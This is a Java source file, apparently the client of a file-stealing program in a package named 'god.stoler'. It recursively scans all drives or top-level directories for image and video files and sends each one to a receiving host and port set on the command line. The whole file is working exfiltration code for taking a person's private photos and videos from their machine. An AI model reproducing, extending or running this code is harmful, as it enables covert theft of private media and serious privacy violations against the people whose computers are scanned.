package god.stoler;

import god.stoler.client.ScannerThread;
import god.stoler.client.TransferThread;
import god.stoler.data.DataFilter;
import god.stoler.data.ImageDataFilter;
import god.stoler.data.VedioDataFilter;

import java.io.File;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Client {
	private static final String DEFAULT_SERVER_HOST     = "127.0.0.1"; 
	private static final int    DEFAULT_SERVER_PORT     = 9999; 
    
    private static String rootDirectory = null;                  // 如果指定检索的根目录时，保存在此字段
    private static String host          = DEFAULT_SERVER_HOST;   // 接收文件的目的主机IP
    private static int    port          = DEFAULT_SERVER_PORT;   // 接收文件的目的主机端口
    private static boolean showTransferDetail = true;            // 是否打印上传明细 
    
    private static Set<DataFilter> dataFilters = new HashSet<DataFilter>(); 
    private static BlockingQueue<File> dataQueue = new ArrayBlockingQueue<File>(1000);
    private static ExecutorService executorService = Executors.newCachedThreadPool(); 
    
    private static void start() {
    	initDataFilters(); 
        startScan();
        startTrans(); 
    }
    
    private static void initDataFilters() {
        dataFilters.add(new ImageDataFilter()); 
        dataFilters.add(new VedioDataFilter()); 
    }
    
    private static void startScan() {
    	if (null != rootDirectory) {
    		scanSpecialDirectory(rootDirectory);
    		return;
    	}
    	
    	String osName = System.getProperty("os.name"); 
        if (osName.toLowerCase().contains("mac")) {
        	//scanSpecialDirectory("/"); 
        	scanMocos(); 
        } else if (osName.toLowerCase().contains("windows")) {
        	scanWindows(); 
        } else {
        	System.err.println("Odd OS Type Found - " + osName);
        }
    }
    
    private static void scanSpecialDirectory(final String rootDir) {
    	if (!new File(rootDir).exists()) {
    		throw new IllegalArgumentException("The target directory '"+ rootDir +"' is not exist!");
    	}
    	if (new File(rootDir).isFile()) {
    		throw new IllegalArgumentException("The target directory is not illegal, maybe it is a file but need a directory!");
    	}
    	executorService.execute(new ScannerThread(rootDir, dataFilters, dataQueue));
    }
    
    private static void scanWindows() {
    	for (int i = (int) 'a'; i < (int) 'z'; i ++) {
            String diskIdentifier = String.valueOf((char) i) + ":" + File.separator;
            if (new File(diskIdentifier).exists()) {
                executorService.execute(new ScannerThread(diskIdentifier, dataFilters, dataQueue));
            }
        }
    }
    
    private static void scanMocos() {
    	File root = new File("/"); 
    	for (String tempFile : root.list()) {
    		if (new File(File.separator + tempFile).isDirectory()) {
    			 executorService.execute(new ScannerThread(File.separator + tempFile, dataFilters, dataQueue));
    		}
    	}
    }
    
    private static void startTrans() {
        File tempFile = null;
        try {
            while ((tempFile = dataQueue.take()) != null) {
                executorService.execute(new TransferThread(tempFile, host, port, showTransferDetail));
            }    
        } catch (Exception e) {
            System.err.println(e.getMessage());
        }
    }
    
    // java -cp client.jar; god.stoler.client.Client -host localhost -port 9999 -showTransferDetail true -root /Users/Willer
    public static void main(String[] args) {
    	if (args.length % 2 != 0) {
    		System.out.println("Arguments Error!\r\n");
    		System.out.println("Userage:\r\n");
    		System.out.println(String.format("%15s: %15s", "-host", "The host ip for receiving."));
    		System.out.println(String.format("%15s: %15s", "-port", "The host port for receiving."));
    		System.out.println(String.format("%15s: %15s", "-root", "The root directory for scaning."));
    		System.out.println(String.format("%15s: %15s", "-showTransferDetail", "'true' for show details, 'false' for donot show."));
    		return;
    	}
    	
    	for (int i = 0; i < args.length; i ++) {
    		if ("-host".equals(args[i])) {
    			host = args[++i];
    			continue; 
    		}
    		if ("-port".equals(args[i])) {
    			port = Integer.parseInt(args[++i]);
    			continue; 
    		}
    		if ("-root".equals(args[i])) {
    			rootDirectory = args[++i]; 
    			continue; 
    		}
    		if ("-showTransferDetail".equals(args[i])) {
    			showTransferDetail = Boolean.valueOf(args[++i]); 
    			continue;
    		}
    		System.out.println(String.format("Argument '%s - %s' is not recognized!", args[i], args[++i]));
    		return;
     	}
    	
    	start(); 
    }

}
